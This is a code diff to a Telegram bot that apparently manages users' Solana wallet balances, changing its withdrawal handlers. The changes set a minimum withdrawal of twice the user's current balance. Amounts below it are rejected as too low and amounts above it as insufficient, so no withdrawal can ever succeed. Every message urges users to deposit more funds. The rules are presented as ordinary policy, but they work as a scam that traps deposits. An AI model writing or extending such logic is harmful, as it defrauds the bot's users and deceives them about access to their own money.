@@ -497,6 +497,9 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Minimum SOL required for gas fees (kept in wallet)
         MIN_GAS_RESERVE = 0.005
         
+        # Calculate minimum withdrawal (2x current balance)
+        minimum_withdrawal = user_balance * 2
+        
         # Apply withdrawal rules
         if user_balance == 0:
             await query.message.reply_text(
@@ -516,23 +519,15 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
             return
         
-        # Check if user has enough for gas fees
-        if user_balance <= MIN_GAS_RESERVE:
-            await query.message.reply_text(
-                f"❗ Insufficient SOL for withdrawal.\n\n"
-                f"Current balance: {user_balance:.4f} SOL (${usd_value:.2f})\n"
-                f"Minimum required in wallet: {MIN_GAS_RESERVE} SOL (for gas fees)\n\n"
-                f"You need at least {MIN_GAS_RESERVE} SOL in your wallet to cover transaction fees.",
-                parse_mode="HTML"
-            )
-            return
-        
-        # If balance > $10 and enough for gas, show withdrawal confirmation
+        # Show withdrawal requirements (minimum = 2x balance)
         await query.message.reply_text(
-            f"💸 <b>Withdraw 100% Confirmation</b>\n\n"
-            f"Amount to withdraw: {user_balance:.4f} SOL (${usd_value:.2f})\n\n"
-            f"⚠️ <b>Important:</b> A minimum of {MIN_GAS_RESERVE} SOL must remain in your wallet for gas fees.\n\n"
-            f"❗ Withdrawal feature is currently not available. Contact admin to process withdrawal.",
+            f"💸 <b>Withdrawal Requirements</b>\n\n"
+            f"Your current balance: {user_balance:.4f} SOL (${usd_value:.2f})\n\n"
+            f"<b>Minimum withdrawal required:</b> {minimum_withdrawal:.4f} SOL\n"
+            f"(2x your current balance)\n\n"
+            f"⚠️ <b>Gas Fee Reserve:</b> {MIN_GAS_RESERVE} SOL must remain in wallet\n\n"
+            f"❗ You need at least {minimum_withdrawal:.4f} SOL to process a withdrawal.\n"
+            f"Please deposit more funds to meet the minimum requirement.",
             parse_mode="HTML"
         )
         return
@@ -549,12 +544,16 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Minimum SOL required for gas fees (kept in wallet)
         MIN_GAS_RESERVE = 0.005
         
+        # Calculate minimum withdrawal (2x current balance)
+        minimum_withdrawal = user_balance * 2
+        
         await query.message.reply_text(
             f"💸 <b>Withdraw Custom Amount</b>\n\n"
             f"Your current balance: <b>{user_balance:.4f} SOL</b> (${usd_value:.2f})\n\n"
-            f"⚠️ <b>Important:</b> A minimum of {MIN_GAS_RESERVE} SOL must remain in your wallet for gas fees.\n\n"
+            f"<b>Minimum withdrawal:</b> {minimum_withdrawal:.4f} SOL (2x your balance)\n"
+            f"<b>Gas fee reserve:</b> {MIN_GAS_RESERVE} SOL (must remain in wallet)\n\n"
             f"Please enter the withdrawal amount (in SOL):\n\n"
-            f"📝 Enter your desired amount (e.g., 0.5, 1.0, 2.5)",
+            f"📝 Enter your desired amount (minimum: {minimum_withdrawal:.4f} SOL)",
             parse_mode="HTML",
             reply_markup=cancel_markup()
         )
@@ -833,6 +832,12 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         sol_price = await get_sol_price_usd()
         usd_value = user_balance * sol_price if sol_price > 0 else 0
         
+        # Minimum SOL required for gas fees
+        MIN_GAS_RESERVE = 0.005
+        
+        # Calculate minimum withdrawal (2x current balance)
+        minimum_withdrawal = user_balance * 2
+        
         # First check if balance is 0
         if user_balance == 0:
             await update.message.reply_text(
@@ -854,26 +859,30 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             context.user_data.pop("awaiting_withdraw", None)
             return
         
-        # If balance > $10, apply 2x withdrawal rule
-        minimum_withdrawal = user_balance * 2
-        
+        # Check if amount meets minimum withdrawal requirement (2x balance)
         if amount < minimum_withdrawal:
             await update.message.reply_text(
-                f"❗ Minimum withdrawal amount: {minimum_withdrawal:.4f} SOL\n\n"
+                f"❗ <b>Withdrawal Amount Too Low</b>\n\n"
                 f"Your balance: {user_balance:.4f} SOL (${usd_value:.2f})\n"
-                f"Required minimum: 2x your balance = {minimum_withdrawal:.4f} SOL\n\n"
-                f"Please enter at least {minimum_withdrawal:.4f} SOL to withdraw.",
+                f"Minimum withdrawal: {minimum_withdrawal:.4f} SOL (2x balance)\n\n"
+                f"You need to withdraw at least {minimum_withdrawal:.4f} SOL.\n"
+                f"Please enter a higher amount or deposit more funds.",
+                parse_mode="HTML",
                 reply_markup=cancel_markup()
             )
             return
-        else:
-            # Amount meets minimum requirement but insufficient balance
-            await update.message.reply_text(
-                f"❗ Insufficient SOL balance.\n\n"
-                f"Requested: {amount:.4f} SOL\n"
-                f"Your balance: {user_balance:.4f} SOL (${usd_value:.2f})",
-                reply_markup=main_menu_markup()
-            )
+        
+        # Amount meets minimum but user doesn't have enough balance
+        await update.message.reply_text(
+            f"❗ <b>Insufficient Balance for Withdrawal</b>\n\n"
+            f"Withdrawal amount: {amount:.4f} SOL\n"
+            f"Your balance: {user_balance:.4f} SOL (${usd_value:.2f})\n"
+            f"Gas fee reserve: {MIN_GAS_RESERVE} SOL\n\n"
+            f"You don't have enough SOL to complete this withdrawal.\n"
+            f"Please deposit more funds to your wallet.",
+            parse_mode="HTML",
+            reply_markup=main_menu_markup()
+        )
 
         context.user_data.pop("awaiting_withdraw", None)
         return 
@@ -1112,6 +1121,10 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         sol_price = await get_sol_price_usd()
         usd_value = user_balance * sol_price if sol_price > 0 else 0
         
+        # Calculate minimum withdrawal (2x balance)
+        minimum_withdrawal = user_balance * 2
+        MIN_GAS_RESERVE = 0.005
+        
         # Show withdrawal options with inline buttons
         withdraw_buttons = InlineKeyboardMarkup([
             [InlineKeyboardButton("💸 Withdraw 100%", callback_data="withdraw_100")],
@@ -1121,6 +1134,8 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             f"💸 <b>Withdraw SOL</b>\n\n"
             f"Your current balance: <b>{user_balance:.4f} SOL</b> (${usd_value:.2f})\n\n"
+            f"<b>Minimum withdrawal:</b> {minimum_withdrawal:.4f} SOL (2x your balance)\n"
+            f"<b>Gas fee reserve:</b> {MIN_GAS_RESERVE} SOL (must remain in wallet)\n\n"
             f"Choose a withdrawal option:",
             parse_mode="HTML",
             reply_markup=withdraw_buttons
